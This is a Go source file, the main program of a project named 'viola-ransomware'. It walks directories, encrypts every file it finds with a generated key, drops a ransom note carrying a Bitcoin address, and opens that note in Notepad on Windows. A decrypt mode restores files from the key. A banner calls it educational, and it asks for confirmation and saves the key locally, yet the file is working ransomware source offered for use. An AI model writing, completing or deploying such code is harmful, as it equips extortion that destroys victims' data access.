package main

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"viola-ransomware/config"
	"viola-ransomware/crypto"
	"viola-ransomware/enumeration"
	"viola-ransomware/readwrite"
)

const Banner = "Welcome To Viola-Ransomware | %s\nNote : This tools is for educational purposes only\n"

func CreateMessage() {
	Message := fmt.Sprintf(config.RansomwareMessage, config.BitcoinAddress)

	writeFiles := readwrite.WriteFilesNoExt(Message, "ransom.txt")

	if !writeFiles {
		fmt.Println("Failed create ransom message ...")
		return
	}

	if runtime.GOOS == "windows" {
		exepath := "C:\\Windows\\system32\\notepad.exe"
		file := "ransom.txt"
		cmd := exec.Command(exepath, file)
		cmd.Stdin = os.Stdin
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		err := cmd.Start()
		if err != nil {
			fmt.Println("Failed summon notepad")
			return
		}

	}
}

func Clear_Terminal() {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	} else {
		cmd = exec.Command("clear")
	}

	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()
}

// encrypt
func StartTheGame(key string, AllDirectory []string, decrypt bool) {
	// read file first
	for _, path := range AllDirectory {
		data, err := readwrite.ReadFile(path)
		if err != nil {
			continue
		}

		if decrypt {
			dataDec, err := crypto.Decrypt(key, data)
			if err != nil {
				fmt.Println("Failed decrypt data : ", path)
				continue
			}
			// write into files

			if !readwrite.WriteFiles(dataDec, path, decrypt) {
				fmt.Println("Failed write files : ", path)
				continue
			}

			fmt.Println("Success decrypt files :", path)
		} else {
			// encrypt the data
			dataEncrypt, err := crypto.Encrypt(key, data)
			if err != nil {
				fmt.Println("Failed encrypt data : ", path)
				continue
			}
			// write into files

			if !readwrite.WriteFiles(dataEncrypt, path, decrypt) {
				fmt.Println("Failed write files : ", path)
				continue
			}

			fmt.Println("Success encrypt files :", path)
		}

	}

}

func main() {
	var encordec int
	var isContinue string
	var key string
	decrypt := false
	Clear_Terminal()

	fmt.Println(fmt.Sprintf(Banner, config.GithubLink))
	fmt.Print("[1] Encrypt Files\n[2] Decrypt Files\nSelect: ")
	fmt.Scan(&encordec)

	switch encordec {
	case 1:
		fmt.Print("[!] Warning: This Tool Will Encrypt Your Data. Is it okay? [y/n]: ")
		fmt.Scan(&isContinue)
		if isContinue != "y" {
			return
		}

		fmt.Println("\nGenerating key...")
		key = crypto.KeyGenerator(config.KeyByte)
		fmt.Println("Scanning Files...")
	case 2:
		decrypt = true
		fmt.Print("Input key for decrypt : ")
		fmt.Scan(&key)
	default:
		fmt.Println("Invalid selection")
		return
	}

	AllDirectory, err := enumeration.DirectoryEnumeration(decrypt)
	if err != nil {
		panic(err.Error())
	}

	if len(AllDirectory) == 0 {
		fmt.Println("No directory to scan (empty)")
		return
	}

	if encordec == 1 {
		fmt.Printf("Found %d files to encrypt...\n", len(AllDirectory))
		fmt.Print("\n[!] Warning: This Tool Will Encrypt Your Data. Is it okay? [y/n]: ")
		fmt.Scan(&isContinue)
		if isContinue != "y" {
			return
		}
	}

	StartTheGame(key, AllDirectory, decrypt)

	if encordec == 1 {
		fmt.Println("Saving key to key.txt for decrypting...")
		readwrite.SaveKey(key)
		CreateMessage()
	}

}
